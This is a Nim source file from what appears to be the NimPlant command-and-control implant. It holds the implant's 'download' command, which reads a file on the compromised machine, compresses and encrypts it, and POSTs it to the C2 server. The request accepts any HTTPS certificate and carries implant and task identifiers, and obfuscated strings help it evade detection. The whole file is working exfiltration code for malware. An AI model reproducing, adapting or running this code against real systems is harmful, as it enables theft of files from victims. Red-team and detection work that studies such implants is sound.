import puppy, zippy
from strutils import toLowerAscii
from os import fileExists
from ../util/webClient import Listener
from ../util/crypto import encryptData

# Upload a file from the C2 server to NimPlant
# From NimPlant's perspective this is similar to wget, but calling to the C2 server instead
proc download*(li : Listener, cmdGuid : string,  args : varargs[string]) : string =
    var 
        filePath : string
        file : string
        url : string
        res : Response

    if args.len == 1 and args[0] != "":
        filePath = args[0]
    else:
        # Handling of the first argument (filename) should be done done by the python server
        result = obf("Invalid number of arguments received. Usage: 'download [remote file] <optional: local destination path>'.")
        return
    
    # Construct the URL to upload the file to
    url = toLowerAscii(li.listenerType) & obf("://")
    if li.listenerHost != "":
        url = url & li.listenerHost
    else:
        url = url & li.listenerIp & obf(":") & li.listenerPort
    url = url & li.taskpath & obf("/u")

    # Read the file only if it is a valid file path
    if fileExists(filePath):
        file = encryptData(compress(readFile(filePath)), li.cryptKey)
    else:
        result = obf("Path to download is not a file. Usage: 'download [remote file] <optional: local destination path>'.")
        return

    # Prepare the Puppy web request
    let req = Request(
        url: parseUrl(url),
        verb: "post",
        allowAnyHttpsCertificate: true,
        headers: @[
            Header(key: obf("User-Agent"), value: li.userAgent),
            Header(key: obf("Content-Encoding"), value: obf("gzip")),
            Header(key: obf("X-Identifier"), value: li.id), # Nimplant ID
            Header(key: obf("X-Unique-ID"), value: cmdGuid)  # Task GUID
        ],
        body: file
    )

    # Get the file - Puppy will take care of transparent gzip deflation
    res = fetch(req)
    
    result = "" # Server will know when the file comes in successfully or an error occurred